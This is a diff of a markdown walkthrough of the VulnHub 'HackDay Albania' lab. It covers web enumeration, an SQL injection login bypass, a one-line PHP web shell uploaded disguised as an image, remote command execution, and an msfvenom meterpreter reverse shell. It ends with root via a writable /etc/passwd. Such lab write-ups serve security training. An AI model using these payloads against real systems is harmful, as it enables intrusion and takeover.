@@ -51,6 +51,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.54 seconds
 So there is only an open SSH port and one apache running on port 8008.
 
 The Startpage only presents some albanian text wich translates to (at least according to Google Translate):
+
 ```
 Welcome
 If I am, I know where to go;)
@@ -60,6 +61,7 @@ OK ok, but not here :)
 [![Startpage](/img/vulnhub_hackday_albania/startpage_thumb.png)](/img/vulnhub_hackday_albania/startpage.png)
 
 Nmap said the `robots.txt` on this host has 26 entries so lets have a look at those:
+
 ```
 root@kali:~# curl -s http://192.168.56.101:8008/robots.txt
 Disallow: /rkfpuzrahngvat/
@@ -102,6 +104,7 @@ for x in $(curl -s http://192.168.56.101:8008/robots.txt | sed -e "s/Disallow: /
 ```
 
 Checking out the downloaded files I quickly noted that there is one meme missing:
+
 ```
 root@kali:~/albania# file *.bin
 atoydiajqwpejc.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
@@ -133,6 +136,7 @@ zsnxchzipvodib.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1
 ```
 
 Checking the corresponding logfile shows that the image could not be found in folder `unisxcudkqjydw`.
+
 ```
 root@kali:~/albania# cat unisxcudkqjydw.log
 --2016-11-24 10:19:45--  http://192.168.56.101:8008/unisxcudkqjydw/background.jpg
@@ -142,11 +146,13 @@ HTTP request sent, awaiting response... 404 Not Found
 ```
 
 So lets call this folder in the browser to see, why this error happened. This directory is the only one with no meme in it, but a little hint:
+
 ```
 IS there any /vulnbank/ in there ???
 ```
 
 So after calling
+
 ```
 http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/
 ```
@@ -158,11 +164,13 @@ We are presented a login page for Secure Bank.
 I first tried to log in with various default passwort combinations but none of them worked.
 
 After putting a single `'` in the username field, the application responds with an PHP error message:
+
 ```
 Warning: mysqli_fetch_assoc() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/unisxcudkqjydw/vulnbank/client/config.php on line 102
 ```
 
 **BOOM** looks like SQL-Injection. As I'm lazy I fired up SQLMAP to do the job for me:
+
 ```
 sqlmap -u "http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/login.php" --data "username=&password=" --dbms mysql --level 5 --risk 3
 ```
@@ -172,11 +180,13 @@ Unfortunately SQLMAP was only able to verify the SQL-Injection but not exploit i
 Sending the request to Burp Intruder I tried the SQL Injection Fuzzing Payloads and it looks like the application is filtering some SQL keywords like "AND" and "OR".
 
 Assuming the query looks something like this
+
 ```php
 select junk from users where username='$_GET["username"]' and password='$_GET["password"]';
 ```
 
 a simple query like
+
 ```
 username'; --
 ```
@@ -184,6 +194,7 @@ username'; --
 should bypass the check (note the extra space at the end).
 
 If the query works, the following SQL statement should be executed and the password check is commented out:
+
 ```SQL
 select junk from users where username='username'; -- ' and password='';
 ```
@@ -201,6 +212,7 @@ jeff'; --
 ```
 
 which results in the query
+
 ```SQL
 select junk from users where username='jeff';
 ```
@@ -208,6 +220,7 @@ select junk from users where username='jeff';
 We are greeted with a ticket system with the ability to upload files. I first tried to upload a simple PHP shell but the application responds with an error message saying only graphic files with certain extensions are allowed. Trying to simply change the `Content-Type` header does not work so I decided to upload a normal image to see how the application behaves.
 After uploading we can call the ticket details and check out the image url.
 The image is included with the following URL which renders the image as text so this could be a simple PHP include vulnerability.
+
 ```
 http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=image.jpg
 ```
@@ -215,15 +228,19 @@ http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename
 ![pwned](/img/vulnhub_hackday_albania/image_as_text.png)
 
 So I just renamed my shell.php to shell.jpg and tried the upload again. After viewing the image in the ticket with
+
 ```
 http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=shell.jpg&cmd=id
 ```
+
 we are able to execute commands as the www-data user.
+
 ```
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 shell.php content:
+
 ```PHP
 <?php echo shell_exec($_GET['cmd']); ?>
 ```
@@ -235,11 +252,13 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -o meterpreter.jpg LHOST=19
 ```
 
 After making the binary executable with
+
 ```
 http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=shell.jpg&cmd=chmod%20%2bx%20./upload/meterpreter.jpg
 ```
 
 we can verify it's now executable
+
 ```
 http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=shell.jpg&cmd=ls%20-alh%20./upload/meterpreter.jpg
 ```
@@ -334,6 +353,7 @@ taviso:x:1000:1000:Taviso,,,:/home/taviso:/bin/bash
 ```
 
 Looking at the groups taviso is able to execute sudo so this might be a good start:
+
 ```
 $ grep taviso /etc/group
 adm:x:4:syslog,taviso
@@ -386,6 +406,7 @@ $ find / -type f -perm -o+w -exec ls -l {} \; 2>/dev/null | grep -v /proc/ | gre
 ```
 
 So I downloaded the `/etc/passwd` with meterpreter and generated a new password hash with python:
+
 ```
 root@kali:~# python -c 'import crypt; print crypt.crypt("supersecretpassword", "$6$saltsalt$")'
 $6$saltsalt$t084OTPu49EJVUgFTLQxZ4yArFIeFzEnpGtrpyifSoSmJuIk0rQ9YmVXUyd2.Is1eMV/S0loZUxni1ijH5Qem.
@@ -429,6 +450,7 @@ d5ed38fdbf28bc4e58be142cf5a17cf5
 `d5ed38fdbf28bc4e58be142cf5a17cf5` is the MD5 hash of the string `rio`.
 
 The original password hash of `taviso` extracted from `/etc/shadow`:
+
 ```
 taviso:$6$RpYQyuNB$yYNQbBo6ICCb0pwNKBMVeQeA/NZwrYPxy4WnXs2NybNeGAh3XrmkJ94cuqA1.CYc0e07R.QbQEIdXLIL5U83T1:17096:0:99999:7:::
 ```
